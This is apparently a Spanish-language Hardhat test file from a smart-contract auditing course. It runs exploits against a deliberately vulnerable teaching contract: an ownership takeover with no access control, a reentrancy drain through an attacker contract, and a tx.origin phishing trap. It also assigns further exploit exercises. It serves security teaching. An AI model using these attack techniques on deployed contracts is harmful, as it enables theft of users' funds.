import assert from "node:assert/strict";
import { describe, it } from "node:test";
import { network } from "hardhat";
import { getAddress, parseEther } from "viem";

// Este test explota ALGUNOS de los bugs de ContratoParaAuditar, como
// ejemplo de tecnica. Encontrar el resto (y escribir un test que los
// demuestre) es el ejercicio de la leccion 17 en docs/.
describe("17 - Checklist de auditoria (capstone)", async function () {
  const { viem } = await network.create();
  const publicClient = await viem.getPublicClient();
  const [owner, victima, atacante] = await viem.getWalletClients();

  async function desplegar() {
    const oraculo = await viem.deployContract("OraculoDePruebaAuditoria", [2000n * 10n ** 18n]);
    const contrato = await viem.deployContract("ContratoParaAuditar", [oraculo.address]);
    return { oraculo, contrato };
  }

  it("uso normal: depositar y retirar funciona como se espera", async function () {
    const { contrato } = await desplegar();

    await contrato.write.depositar({ value: parseEther("1"), account: victima.account });
    await contrato.write.retirar({ account: victima.account });

    assert.equal(await contrato.read.balances([victima.account.address]), 0n);
  });

  it("bug: cambiarOwner no tiene control de acceso", async function () {
    const { contrato } = await desplegar();

    await contrato.write.cambiarOwner([atacante.account.address], { account: atacante.account });

    assert.equal(getAddress(await contrato.read.owner()), getAddress(atacante.account.address));
  });

  it("bug: retirar() es vulnerable a reentrancy", async function () {
    const { contrato } = await desplegar();
    const atacanteContrato = await viem.deployContract("AtacanteAuditoria", [contrato.address]);

    await contrato.write.depositar({ value: parseEther("5"), account: victima.account });

    await atacanteContrato.write.atacar({ value: parseEther("1") });

    // El atacante se llevo su deposito Y el de la victima.
    assert.equal(await publicClient.getBalance({ address: atacanteContrato.address }), parseEther("6"));
    assert.equal(await contrato.read.balances([victima.account.address]), parseEther("5")); // "saldo" que ya no existe de verdad
  });

  it("bug: retiroDeEmergencia() confia en tx.origin, no en msg.sender", async function () {
    const { contrato } = await desplegar();
    const trampa = await viem.deployContract("PhishingAuditoria", [contrato.address, atacante.account.address]);

    await contrato.write.depositar({ value: parseEther("3"), account: owner.account });

    const antes = await publicClient.getBalance({ address: atacante.account.address });

    // El OWNER firma esta transaccion creyendo que hace otra cosa.
    await trampa.write.reclamarRecompensa({ account: owner.account });

    const despues = await publicClient.getBalance({ address: atacante.account.address });
    assert.equal(despues - antes, parseEther("3"));
  });

  // Ejercicio: escribe un test que explote otorgarRecompensa() con
  // unchecked, y otro que demuestre que valorColateralEnUsd() no valida el
  // precio del oraculo. Las lecciones 03 y 16 (de este modulo) y la leccion
  // 16 del modulo 02 tienen todo lo que necesitas.
});
